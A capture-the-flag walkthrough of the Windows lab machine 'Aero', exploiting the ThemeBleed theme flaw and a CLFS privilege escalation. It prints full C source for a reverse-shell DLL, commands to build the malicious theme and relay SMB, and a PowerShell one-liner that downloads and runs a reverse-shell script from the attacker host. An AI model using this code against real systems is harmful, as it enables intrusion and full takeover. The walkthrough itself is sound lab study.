
## About

Aero is a medium-difficulty Windows machine featuring two recent CVEs: CVE-2023-38146 , affecting Windows 11 themes, and CVE-2023-28252 , targeting the Common Log File System (CLFS). Initial access is achieved through the crafting of a malicious payload using the ThemeBleed proof-of-concept, resulting in a reverse shell. Upon gaining a foothold, a CVE disclosure notice is found in the user&amp;#039;s home directory, indicating vulnerability to CVE-2023-28252 . Modification of an existing proof-of-concept is required to facilitate privilege escalation to administrator level or code execution as NT Authority\SYSTEM.
## Nmap

```
PORT     STATE SERVICE    VERSION
80/tcp   open  http       Microsoft IIS httpd 10.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Aero Theme Hub
|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
|_http-server-header: Microsoft-IIS/10.0
7680/tcp open  pando-pub?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
## Port 80

Checking the website, This seems interesting

![](pics/Pasted%20image%2020260903095504.png)

## Finding the exploit

![](pics/Pasted%20image%2020260903112640.png)
## Setting up the exploit

Export `VerifyThemeVersion` function
```c
#include <winsock2.h>
#include <windows.h>
#include <io.h>
#include <process.h>
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma comment(lib, "ws2_32.lib")

void rs(char *CLIENT_IP, int CLIENT_PORT) {
	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2 ,2), &wsaData) != 0) {
		write(2, "[ERROR] WSASturtup failed.\n", 27);
		return;
	}

	int port = CLIENT_PORT;
	struct sockaddr_in sa;
	SOCKET sockt = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
	sa.sin_family = AF_INET;
	sa.sin_port = htons(port);
	sa.sin_addr.s_addr = inet_addr(CLIENT_IP);

	if (connect(sockt, (struct sockaddr *) &sa, sizeof(sa)) != 0) {
		write(2, "[ERROR] connect failed.\n", 24);
		return;
	}

	STARTUPINFO sinfo;
	memset(&sinfo, 0, sizeof(sinfo));
	sinfo.cb = sizeof(sinfo);
	sinfo.dwFlags = (STARTF_USESTDHANDLES);
	sinfo.hStdInput = (HANDLE)sockt;
	sinfo.hStdOutput = (HANDLE)sockt;
	sinfo.hStdError = (HANDLE)sockt;
	PROCESS_INFORMATION pinfo;
	CreateProcessA(NULL, "cmd", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);

	return;
}

// this is very important if you ar compiling on windows.
void __declspec(dllexport) VerifyThemeVersion(){
    rs("<IP>", <PORT>);
    return;
}
```

Compile DLL
```
 cl.exe .\reverseShell.c /LD 
```

Check if the function is exported
```
dumpbin.exe  /exports .\reverseShell.dll
```

![](pics/Pasted%20image%2020260903093456.png)

Check if the `dll` function is working
```
rundll32.exe .\reverseShell.dll  VerifyThemeVersion
```

![](pics/Pasted%20image%2020260903093528.png)

![](pics/Pasted%20image%2020260903093541.png)

**Note:** I changed the IP back after testing.

Rename the dll to `stage_3`, Make the `.theme` file

```
 .\ThemeBleed.exe make_theme 10.10.14.82  exploit.theme
```

Move it to kali

![](pics/Pasted%20image%2020260903094423.png)
## Exploit 1

After compiling our own DLL that gives a reverse shell and generating the `.theme` file now we are ready to run the exploit.

Start the SMB server

```
.\ThemeBleed.exe server 
```

Since we pointed the theme to our kali we need to forward it to the windows

```
sudo socat TCP-LISTEN:445,fork,reuseaddr TCP:192.168.58.135:445
```

Upload the malicious theme file

![](pics/Pasted%20image%2020260903095535.png)

**Note**: make sure the `Server` service is not running because the themebleed exploit needs it.

We hit the race condition

![](pics/Pasted%20image%2020260903102359.png)

Got the shell

![](pics/Pasted%20image%2020260903102439.png)
## Flag 1

![](pics/Pasted%20image%2020260903102606.png)


## PrivEsc

Check for vulnerable apps

![](pics/Pasted%20image%2020260903102749.png)

Check privs

![](pics/Pasted%20image%2020260903103006.png)

Enumerating user directory, Found a CVE file.

![](pics/Pasted%20image%2020260903103201.png)

Read file

```
powershell -Command "[Convert]::ToBase64String([IO.File]::ReadAllBytes('CVE-2023-28252_Summary.pdf'))
```

![](pics/Pasted%20image%2020260903103616.png)

Decode and save to a file

```
base64 -d cve.pdf.b64 > cve.pdf
```

Open it

```
xdg-open cve.pdf
```

![](pics/Pasted%20image%2020260903103928.png)

### Exploit 2

Lets find a PoC

![](pics/Pasted%20image%2020260903105208.png)

setup the `ps1` reverseshell script

```bash
cp /usr/share/nishang/Shells/Invoke-PowerShellTcpOneLine.ps1 shell.ps1
```

Edit the IP and PORT

![](pics/Pasted%20image%2020260903111822.png)

Serve the files both the PoC and the `shell.ps1`

```bash
python3 -m http.server 
```

Download the PoC into the machine

```
curl http://10.10.14.82:8000/clfs_eop.exe -O
```

Payload download then execute a ps1 reverse shell script (famous one-liner)

```
.\clfs_eop.exe "powershell.exe IEX(New-Object Net.Webclient).DownloadString('http://10.10.14.82:8000/shell.ps1')"
```

![](pics/Pasted%20image%2020260903112033.png)

Got the shell

![](pics/Pasted%20image%2020260903112049.png)

## Flag 2

![](pics/Pasted%20image%2020260903112126.png)

Done.

![](pics/Pasted%20image%2020260903112211.png)


